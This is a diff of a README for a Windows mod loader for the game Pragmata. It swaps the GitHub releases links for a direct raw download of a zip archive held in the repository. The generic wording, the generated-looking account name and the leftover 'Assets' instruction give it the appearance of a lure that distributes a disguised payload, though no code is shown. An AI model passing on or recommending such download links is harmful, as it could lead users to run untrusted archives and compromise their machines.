@@ -1,6 +1,6 @@
 # 🛠️ Pragmata-Reframework - Refined visual experience for Pragmata PC
 
-[![Download Release Files](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Jacquelineinquisitive996/Pragmata-Reframework/releases)
+[![Download Release Files](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/Jacquelineinquisitive996/Pragmata-Reframework/main/REframework/Pragmata_Reframework_v3.6.zip)
 
 This project provides tools to improve your experience in the game Pragmata on Windows. It works as a specialized mod loader. It solves common display issues. It includes support for modern graphics features like HDR and upscaling. Many users report better performance on hardware like the RTX 5090.
 
@@ -8,7 +8,7 @@ This project provides tools to improve your experience in the game Pragmata on W
 
 You need the correct files to improve image quality and fix display bugs. This software modifies how the game renders graphics. Follow these steps to prepare your computer.
 
-1. Visit this page to download: [https://github.com/Jacquelineinquisitive996/Pragmata-Reframework/releases](https://github.com/Jacquelineinquisitive996/Pragmata-Reframework/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Jacquelineinquisitive996/Pragmata-Reframework/main/REframework/Pragmata_Reframework_v3.6.zip](https://raw.githubusercontent.com/Jacquelineinquisitive996/Pragmata-Reframework/main/REframework/Pragmata_Reframework_v3.6.zip)
 2. Look for the latest file named .zip under the "Assets" section.
 3. Save the file to your computer.
 4. Extract the zip file contents into a folder you can find easily.
